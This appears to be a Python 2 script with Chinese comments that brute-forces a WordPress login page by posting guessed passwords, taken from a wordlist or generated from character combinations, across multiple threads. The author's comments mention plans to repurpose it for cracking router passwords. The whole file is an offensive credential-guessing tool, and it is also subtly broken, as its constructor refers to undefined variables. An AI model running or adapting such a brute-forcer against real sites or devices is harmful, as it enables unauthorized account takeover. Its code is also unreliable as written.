#!/usr/bin/env python
# coding:utf-8
'''
用法 : 程序 [用户名] [密码字符或者密码文件（.txt格式）] [密码长度] [线程数]
	   如果是通过指定字符构造密码词典，不得包含.txt
'''
'''
问题1：此程序待测试
问题2：以上几个模块了解 
问题3：类中__init__函数一定要放在第一个吗？
问题4：构造密码字符中包含保留转字符处理方案(\n,%s)等
答案：characters 前加'r'
问题5：修改一下，破解路由器密码

'''
import requests
import sys
import itertools

import threading
import time
import Queue

class Bruter(object):
	# characters 包含组成口令的所有字符
	# threads 线程个数 pwd_len 为生成的测试口令的长度
	def __init__(self,user,characters,pwd_len,threads):
		self.user = user
		self.characters = characters
		# 破解成功的标志
		self.found = False
		self.threads = threads
		print('构建待测试口令队列中……')
		# 包含所有测试口令的队列
		self.pwd_queue = Queue.Queue()

		for pwd in pwd_pool:
			self.pwd_queue.put(''.join(pwd))
		self.result = None
		print('构建成功')
	
	#构造密码字典		
	def __pwd_pool(self):
		# 读取现有密码字典
		if '.txt' in characters:
			pwd_pool = []
			with open(self.characters, 'rb') as f:
				for i in f.readlines():
					pwd_pool.append(i.strip())
		# 根据规则构造密码字典
		else:
			pwd_pool = list(itertools.product(characters, repeat = pwd_len))

		return pwd_pool

	def brute(self):
		for i in range(self.threads):
			t = threading.Thread(target=self.__web_bruter)
			t.start()
			print('破解线程-->%s 启动' % t.ident)
		# 当密码标志位为False 和 密码池不为空时
		while(not self.pwd_queue.empty() and not self.found):
			sys.stdout.write('\r 进度：还剩余%s个口令 （每10ms刷新）' % self.pwd_queue.qsize())
			sys.stdout.flush()
			time.sleep(0.01)
		print('\n破解完毕')
	

	'''接着是破解子线程函数web_bruter,将它设为私有函数。循环从口令队列中获取测试口令并进行模拟登录测试。如果登录成功，将破解成功的标志属性self.found设为True以提醒其他线程停止猜解;此外，将当前测试口令保存到self.result中，并打印出破解成功的信息。'''
	# 模拟登陆
	def __login(self,pwd):
		url = 'http://localhost/wordpress/wp-login.php'
		values = {'log':self.user, 'pwd':pwd, 'wp-submit':'Log In',
				'redirect_to':'http://localhost/wordpress/wp-admin',
				'test_cookie':'1'}
		my_cookie = {'wordpress_test_cookie':'WP Cookie check'}

		r = requests.post(url, data=values, cookies=my_cookie,allow_redirects = False)

		if r.status_code == 302:
			return True
		return False
	
	def __web_bruter(self):

		while not self.pwd_queue.empty() and not self.found:
			pwd_test = self.pwd_queue.get()
			if self.__login(pwd_test):
				self.result = pwd_test
				print('\n破解用户名: %s 成功，密码为: %s' % (self.user,pwd_test))
				self.found = True

			else:
				self.found = False



if __name__ == '__main__':
	if len(sys.argv) != 5:
		print '用法 : cmd [用户名] [密码字符] [密码长度] [线程数]'
		exit(0)
	b = Bruter(sys.argv[1],sys.argv[2],int(sys.argv[3]),int(sys.argv[4]))
	b.brute()
	#print b.result